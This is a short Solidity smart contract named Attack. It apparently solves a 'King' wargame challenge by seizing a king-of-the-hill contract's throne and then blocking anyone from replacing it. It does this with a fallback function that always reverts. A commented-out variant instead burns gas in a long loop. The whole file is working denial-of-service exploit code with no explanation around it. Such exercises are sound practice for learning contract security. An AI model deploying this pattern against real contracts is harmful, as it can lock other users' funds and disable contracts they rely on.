// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

contract Attack {

  address payable king;
  

  constructor(address payable _king)  payable {
    king = _king;
    
  }

  function attack() public{
    king.call{value: 12000000000000000, gas: 50000}('');
  }

// revert exploit
  fallback() external payable {
    revert();
  }
  /* gas limits exploit
  fallback() external payable {
    uint a = 0;
    for (uint i = 0; i < 10000000; i ++){
        a += i;
    }
*/


  
}